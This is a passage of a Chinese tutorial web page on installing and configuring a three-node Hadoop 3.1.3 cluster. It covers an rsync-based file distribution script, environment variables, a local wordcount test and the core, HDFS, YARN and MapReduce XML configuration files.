.ssh]$ ssh-copy-id hadoop104</p><p>这样hadoop102登录到hadoop103和hadoop104就不需要输入密码了。可以相互登录 还需要在hadoop103和hadoop104上做同样的操作。</p><h3 id="2-4-编写集群分发脚本"><a href="#2-4-编写集群分发脚本" class="headerlink" title="2.4 编写集群分发脚本"></a>2.4 编写集群分发脚本</h3><p>为了在集群中各个主机中文件拷贝方便，我们可以写个脚本用于三台主机中分发文件。</p><p>（1）需求：循环复制文件到所有节点的相同目录下</p><p>（2）需求分析：</p><p>（a）rsync命令原始拷贝：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rsync</span> -av   /opt/module     root@hadoop103:/opt/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（b）期望脚本：</p><p>xsync要同步的文件名称</p><p>（c）说明：在/home/root/bin这个目录下存放的脚本，root用户可以在系统任何地方直接执行。</p><p>（3）脚本实现</p><p>（a）在/home/root/bin目录下创建xsync文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 opt<span class="token punctuation">]</span>$ <span class="token function">cd</span> /home/root<span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> bin<span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> bin<span class="token punctuation">[</span>root@hadoop102 bin<span class="token punctuation">]</span>$ vim xsync<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在该文件中编写如下代码</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bash\#1. 判断参数个数if [ $# -lt 1 ]then echo Not Enough Arguement! exit;fi\#2. 遍历集群所有机器for host in hadoop102 hadoop103 hadoop104do echo ==================== $host ==================== \#3. 遍历所有目录，挨个发送 for file in $@ do  \#4. 判断文件是否存在  if [ -e $file ]  then   \#5. 获取父目录   pdir=$(cd -P $(dirname $file); pwd)   \#6. 获取当前文件的名称   fname=$(basename $file)   ssh $host "mkdir -p $pdir"   rsync -av $pdir/$fname $host:$pdir  else   echo $file does not exists!  fi donedone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（b）修改脚本 xsync 具有执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> +x xsync<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（c）将脚本复制到/bin中，以便全局调用</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">cp</span> xsync /bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（d）测试脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ xsync /home/root/bin<span class="token punctuation">[</span>root@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">sudo</span> xsync /bin/xsync<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-安装hadoop"><a href="#3-安装hadoop" class="headerlink" title="3 安装hadoop"></a>3 安装hadoop</h2><p>Hadoop下载地址：<a href="https://archive.apache.org/dist/hadoop/common/hadoop-3.1.3/">https://archive.apache.org/dist/hadoop/common/hadoop-3.1.3/</a></p><p>1）下载hadoop并进入到Hadoop安装包路径下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> /opt/software/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）解压安装文件到/opt/module下面</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf hadoop-3.1.3.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）查看是否解压成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">ls</span> /opt/module/hadoop-3.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4）将Hadoop添加到环境变量</p><p>​    （1）获取Hadoop安装路径</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">pwd</span>/opt/module/hadoop-3.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    （2）打开/etc/profile.d/my_env.sh文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> vim /etc/profile.d/my_env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在my_env.sh文件末尾添加如下内容：（shift+g）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#HADOOP_HOME</span><span class="token function">export</span> HADOOP_HOME<span class="token operator">=</span>/opt/module/hadoop-3.1.3<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$HADOOP_HOME</span>/bin<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$HADOOP_HOME</span>/sbin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（3）保存后退出:wq</p><p>（4）让修改后的文件生效</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）测试是否安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop versionHadoop 3.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6）重启(如果Hadoop命令不能用再重启)</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">sync</span><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-Hadoop运行模式启动"><a href="#4-Hadoop运行模式启动" class="headerlink" title="4  Hadoop运行模式启动"></a>4  Hadoop运行模式启动</h2><p>Hadoop运行模式包括：本地模式、伪分布式模式以及完全分布式模式。本地允许模式很简单，公司用的大部分是完全分布式模式。</p><p>Hadoop官方网站：<a href="http://hadoop.apache.org/">http://hadoop.apache.org/</a></p><h3 id="4-1-本地运行模式"><a href="#4-1-本地运行模式" class="headerlink" title="4.1 本地运行模式"></a>4.1 本地运行模式</h3><p>下面展示hadoop本地运行模式，并成功计算一个wordcout功能</p><p>1）创建在hadoop-3.1.3文件下面创建一个wcinput文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> wcinpu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）在wcinput文件下创建一个word.txt文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">cd</span> wcinput<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）编辑word.txt文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 wcinput<span class="token punctuation">]</span>$ vim word.txthadoop yarnhadoop mapreducerootroot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保存退出：：wq</p><p>4）回到Hadoop目录/opt/module/hadoop-3.1.3</p><p>5）执行程序</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount wcinput wcoutput<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6）查看结果</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop-3.1.3<span class="token punctuation">]</span>$ <span class="token function">cat</span> wcoutput/part-r-00000root 2hadoop 2mapreduce    1yarn  1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-完全分布式模式"><a href="#4-2-完全分布式模式" class="headerlink" title="4.2 完全分布式模式"></a>4.2 完全分布式模式</h3><h4 id="4-2-1-集群规划"><a href="#4-2-1-集群规划" class="headerlink" title="4.2.1 集群规划"></a>4.2.1 集群规划</h4><p>准备三台机器，分别安装HDFS和yarn。</p><table><thead><tr><th></th><th>hadoop102</th><th>hadoop103</th><th>hadoop104</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNode  DataNode</td><td>DataNode</td><td>SecondaryNameNode  DataNode</td></tr><tr><td>YARN</td><td>NodeManager</td><td>ResourceManager  NodeManager</td><td>NodeManager</td></tr></tbody></table><p>注意：NameNode和SecondaryNameNode不要安装在同一台服务器</p><p>注意：ResourceManager也很消耗内存，不要和NameNode、SecondaryNameNode配置在同一台机器上。</p><h4 id="4-2-2-配置文件说明"><a href="#4-2-2-配置文件说明" class="headerlink" title="4.2.2 配置文件说明"></a>4.2.2 配置文件说明</h4><p>Hadoop配置文件分两类：默认配置文件和自定义配置文件，只有用户想修改某一默认配置值时，才需要修改自定义配置文件，更改相应属性值。</p><p>（1）默认配置文件：</p><table><thead><tr><th>要获取的默认文件</th><th>文件存放在Hadoop的jar包中的位置</th></tr></thead><tbody><tr><td>[core-default.xml]</td><td>hadoop-common-3.1.3.jar/  core-default.xml</td></tr><tr><td>[hdfs-default.xml]</td><td>hadoop-hdfs-3.1.3.jar/  hdfs-default.xml</td></tr><tr><td>[yarn-default.xml]</td><td>hadoop-yarn-common-3.1.3.jar/  yarn-default.xml</td></tr><tr><td>[mapred-default.xml]</td><td>hadoop-mapreduce-client-core-3.1.3.jar/  mapred-default.xml</td></tr></tbody></table><p>2）自定义配置文件：</p><p>core-site.xml、hdfs-site.xml、yarn-site.xml、mapred-site.xml四个配置文件存放在$HADOOP_HOME/etc/hadoop这个路径上，用户可以根据项目需求重新进行修改配置。</p><p>（3）常用端口号说明</p><table><thead><tr><th>Daemon</th><th>App</th><th>Hadoop2</th><th>Hadoop3</th></tr></thead><tbody><tr><td>NameNode Port</td><td>Hadoop HDFS NameNode</td><td>8020 / 9000</td><td>9820</td></tr><tr><td></td><td>Hadoop HDFS NameNode HTTP UI</td><td>50070</td><td>9870</td></tr><tr><td>Secondary NameNode Port</td><td>Secondary NameNode</td><td>50091</td><td>9869</td></tr><tr><td></td><td>Secondary NameNode HTTP UI</td><td>50090</td><td>9868</td></tr><tr><td>DataNode Port</td><td>Hadoop HDFS DataNode IPC</td><td>50020</td><td>9867</td></tr><tr><td></td><td>Hadoop HDFS DataNode</td><td>50010</td><td>9866</td></tr><tr><td></td><td>Hadoop HDFS DataNode HTTP UI</td><td>50075</td><td>9864</td></tr></tbody></table><h4 id="4-2-3-配置集群"><a href="#4-2-3-配置集群" class="headerlink" title="4.2.3 配置集群"></a>4.2.3 配置集群</h4><p>（1）核心配置文件：配置core-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">cd</span> <span class="token variable">$HADOOP_HOME</span>/etc/hadoop<span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ vim core-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>文件内容如下：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 指定NameNode的地址 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>fs.defaultFS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hdfs://hadoop102:9820<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 指定hadoop数据的存储目录 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.tmp.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/opt/module/hadoop-3.1.3/data<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 配HDFS网页登录使用的静态用户为root --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.http.staticuser.user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 配置该root(superUser)允许通过代理访问的主机节点 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.proxyuser.root.hosts<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 配置该root(superUser)允许通过代理用户所属组 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.proxyuser.root.groups<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 配置该root(superUser)允许通过代理的用户--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.proxyuser.root.groups<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）HDFS配置文件:配置hdfs-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ vim hdfs-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件内容如下：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- nn web端访问地址--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.http-address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hadoop102:9870<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 2nn web端访问地址--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.secondary.http-address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hadoop104:9868<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）YARN配置文件:配置yarn-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ vim yarn-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件内容如下：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 指定MR走shuffle --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.aux-services<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>mapreduce_shuffle<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 指定ResourceManager的地址--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.hostname<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hadoop103<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 环境变量的继承 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.env-whitelist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAPRED_HOME<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- yarn容器允许分配的最大最小内存 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.minimum-allocation-mb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>512<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.maximum-allocation-mb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>4096<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- yarn容器允许管理的物理内存大小 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.resource.memory-mb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>4096<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 关闭yarn对物理内存和虚拟内存的限制检查 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.pmem-check-enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.vmem-check-enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）MapReduce配置文件:配置mapred-site.xml</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ vim mapred-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件内容如下：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 指定MapReduce程序运行在Yarn上 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapreduce.framework.name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>yarn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4）在集群上分发配置好的Hadoop配置文件，将配置文件同步到hadoop103和hadoop104</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ xsync /opt/module/hadoop-3.1.3/etc/hadoop/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）去103和104上查看文件分发情况</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop103 ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> /opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml<span class="token punctuation">[</span>root@hadoop104 ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> /opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-2-4-启动集群"><a href="#4-2-4-启动集群" class="headerlink" title="4.2.4  启动集群"></a>4.2.4  启动集群</h4><p><strong>1）配置workers</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@hadoop102 hadoop<span class="token punctuation">]</span>$ vim 